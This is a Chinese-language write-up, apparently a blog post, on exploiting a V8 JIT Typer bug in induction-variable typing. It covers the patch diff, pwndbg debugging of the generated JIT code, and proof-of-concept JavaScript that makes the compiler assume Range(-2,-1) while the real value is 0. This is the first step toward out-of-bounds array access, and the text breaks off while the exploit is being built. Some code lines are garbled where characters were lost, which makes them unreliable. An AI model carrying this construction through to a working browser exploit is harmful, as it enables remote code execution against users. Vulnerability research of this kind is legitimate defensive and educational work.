    #0  v8::internal::compiler::GraphReducer::ReduceNode (this=0x7ffda768a7a8, node=0x561e3b26f350) at ../../src/compiler/graph-reducer.cc:60
    60        } else if (!revisit_.empty()) {
    pwndbg> return
    #0  0x00007f7274531ba0 in v8::internal::compiler::GraphReducer::ReduceGraph (this=0x7ffda768a7a8) at ../../src/compiler/graph-reducer.cc:81
    81    void GraphReducer::ReduceGraph() { ReduceNode(graph()->end()); }
    pwndbg> return
    #0  v8::internal::compiler::Typer::Run (this=0x561e3b1baa50, roots=..., induction_vars=0x7ffda768a950) at ../../src/compiler/typer.cc:433
    433      if (induction_vars != nullptr) {
从以上调试情况来看，我们可以知道`Typer::Visitor::TypeInductionVariablePhi`函数是在`Typer`阶段用于确定`induction
variables`循环变量的最终类型的。通过调试知道，JIT编译器认为poc里的这个循环，i最终类型为`typer_->cache_->kInteger;`，然而，在实际的普通js层，测试发现，i最终类型为`NaN`
    function foo() {
        var x = -Infinity;
        var i = 0;
        for (; i cache_->kInteger) ||
    +      !increment_type.Is(typer_->cache_->kInteger) ||
    +      increment_type.Min() == -V8_INFINITY ||
    +      increment_type.Max() == +V8_INFINITY) {
主要是在原来这个if里面增加了两个条件，判断`increment_type.Min()`和`increment_type.Max()`的值
      // We only handle integer induction variables (otherwise ranges
      // do not apply and we cannot do anything).
      if (!both_types_integer || maybe_nan) {
        // Fallback to normal phi typing, but ensure monotonicity.
        // (Unfortunately, without baking in the previous type, monotonicity might
        // be violated because we might not yet have retyped the incrementing
        // operation even though the increment's type might been already reflected
        // in the induction variable phi.)
        Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node)
                                                  : Type::None();
        for (int i = 0; i >= 0;
首先，将区间取反，这样，对于编译器来说是`Range(-INF,-1)`而真值却为`NaN`，接下来再用max函数，使得Range估算为`(-2,-1)`,真值却仍然为`NaN`，然后利用`>>`运算，`>>
0`运算可以使得`NaN`的值变为0，使得编译器认为`Range(-2,-1)`，而真值为0。  
然后，我们查看IR图
正如预料的那样，编译器的最终评估为`Range(-2,-1)`。  
为了进一步调试真实值的计算过程，我们使用如下代码进行调试
    function opt(index) {
        var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
        var x = -Infinity;
        var i = 0;
        for (; i >= 0; //
        return x;
    }
    %PrepareFunctionForOptimization(opt);
    print(opt(5));
    %OptimizeFunctionOnNextCall(opt);
    print(opt(5));
    %SystemBreak();
    print(opt(5));
使用如下参数进行调试
    set args --allow-natives-syntax ./p.js -print-opt-code
在打印出JIT代码和地址后，我们在JIT代码地址出断点然后调试  
这里是for循环的逻辑
    pwndbg> u rip
       0x257b00082b8c    vpsllq xmm3, xmm3, 0x36
       0x257b00082b91    vpsrlq xmm3, xmm3, 2
       0x257b00082b96    vmovapd xmm1, xmm0
       0x257b00082b9a    vmovapd xmm2, xmm0
       0x257b00082b9e    jmp    0x257b00082bb4 
        ↓
     ► 0x257b00082bb4    vucomisd xmm3, xmm2
       0x257b00082bb8    seta   dl
       0x257b00082bbb    movzx  edx, dl
       0x257b00082bbe    cmp    edx, 0
       0x257b00082bc1    je     0x257b00082be9 
       0x257b00082bc7    cmp    rsp, qword ptr [r13 + 0x60]
    pwndbg> p $xmm3
    $14 = {
      v4_float = {0, 1.875, 0, 1.875}, 
      v2_double = {1, 1}, 
      v16_int8 = {0, 0, 0, 0, 0, 0, -16, 63, 0, 0, 0, 0, 0, 0, -16, 63}, 
      v8_int16 = {0, 0, 0, 16368, 0, 0, 0, 16368}, 
      v4_int32 = {0, 1072693248, 0, 1072693248}, 
      v2_int64 = {4607182418800017408, 4607182418800017408}, 
      uint128 = 84987514980498058628394346335474548736
    }
    pwndbg> p $xmm2
    $15 = {
      v4_float = {0, -nan(0x700000), 0, -nan(0x700000)}, 
      v2_double = {-inf, -inf}, 
      v16_int8 = {0, 0, 0, 0, 0, 0, -16, -1, 0, 0, 0, 0, 0, 0, -16, -1}, 
      v8_int16 = {0, 0, 0, -16, 0, 0, 0, -16}, 
      v4_int32 = {0, -1048576, 0, -1048576}, 
      v2_int64 = {-4503599627370496, -4503599627370496}, 
      uint128 = 340199290171201906239760359964582871040
    }
当for循环逻辑结束后，此时查看循环变量i的值
     ► 0x257b00082bf2    vmovapd xmm3, xmm2
       0x257b00082bf6    vpcmpeqd xmm4, xmm4, xmm4
       0x257b00082bfa    vpsllq xmm4, xmm4, 0x3f
       0x257b00082bff    vxorpd xmm0, xmm4, xmm3
       0x257b00082c03    vpcmpeqd xmm3, xmm3, xmm3
       0x257b00082c07    vpsllq xmm3, xmm3, 0x3e
    ───────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────
    00:0000│ rsp  0x7ffe9b633928 ◂— 0xc /* '\x0c' */
    01:0008│      0x7ffe9b633930 ◂— 0x84
    02:0010│      0x7ffe9b633938 —▸ 0x257b08240cf5 ◂— 0xb90000020a082801
    03:0018│      0x7ffe9b633940 —▸ 0x257b0825018d ◂— 0xe9080406e9082802
    04:0020│      0x7ffe9b633948 —▸ 0x257b08240cf5 ◂— 0xb90000020a082801
    05:0028│ rbp  0x7ffe9b633950 —▸ 0x7ffe9b6339b0 —▸ 0x7ffe9b6339d8 —▸ 0x7ffe9b633a40 —▸ 0x7ffe9b633a90 ◂— ...
    06:0030│      0x7ffe9b633958 —▸ 0x7f23c7e30ad1 (Builtins_InterpreterEntryTrampoline+209) ◂— mov    r14, qword ptr [rbp - 0x18]
    07:0038│      0x7ffe9b633960 ◂— 0xa /* '\n' */
    ─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────
     ► f 0     257b00082bf2
       f 1                c
       f 2               84
       f 3     257b08240cf5
       f 4     257b0825018d
       f 5     257b08240cf5
       f 6     7ffe9b6339b0
       f 7     7f23c7e30ad1 Builtins_InterpreterEntryTrampoline+209
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    pwndbg> p $xmm2
    $23 = {
      v4_float = {0, -nan(0x780000), 0, -nan(0x700000)}, 
      v2_double = {-nan(0x8000000000000), -inf}, 
      v16_int8 = {0, 0, 0, 0, 0, 0, -8, -1, 0, 0, 0, 0, 0, 0, -16, -1}, 
      v8_int16 = {0, 0, 0, -8, 0, 0, 0, -16}, 
      v4_int32 = {0, -524288, 0, -1048576}, 
      v2_int64 = {-2251799813685248, -4503599627370496}, 
      uint128 = 340199290171201906239762611764396556288
    }
i现在是`-NaN`，执行`x = -x`以后·，来到`x = Math.max(x,-2);`逻辑
    pwndbg> p $xmm3
    $27 = {
      v4_float = {0, -2, 0, -2}, 
      v2_double = {-2, -2}, 
      v16_int8 = {0, 0, 0, 0, 0, 0, 0, -64, 0, 0, 0, 0, 0, 0, 0, -64}, 
      v8_int16 = {0, 0, 0, -16384, 0, 0, 0, -16384}, 
      v4_int32 = {0, -1073741824, 0, -1073741824}, 
      v2_int64 = {-4611686018427387904, -4611686018427387904}, 
      uint128 = 255211775190703847611366013629108322304
    }
    pwndbg> p $xmm0
    $28 = {
      v4_float = {0, nan(0x780000), 0, nan(0x700000)}, 
      v2_double = {nan(0x8000000000000), inf}, 
      v16_int8 = {0, 0, 0, 0, 0, 0, -8, 127, 0, 0, 0, 0, 0, 0, -16, 127}, 
      v8_int16 = {0, 0, 0, 32760, 0, 0, 0, 32752}, 
      v4_int32 = {0, 2146959360, 0, 2146435072}, 
      v2_int64 = {9221120237041090560, 9218868437227405312}, 
      uint128 = 170058106710732674498851936011657674752
    }
最后`>> 0`运算被转换为了如下代码
       0x257b00082c5e    vcvttsd2si edx, xmm3
       0x257b00082c62    lea    eax, [rdx + rdx]
       RAX  0x0
       RDX  0x80000000
通过调试，我们发现，生成的JIT代码是没有问题的，确实是按照`NaN`来运算，`bug`仅出现在`IR`分析阶段。接下来，我们继续构造
    function opt(index) {
        var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
        var x = -Infinity;
        var i = 0;
        for (; i < 1; i += x) {
            if (i == -Infinity) x = +Infinity;
        }
        //compiler:Range(1,INF)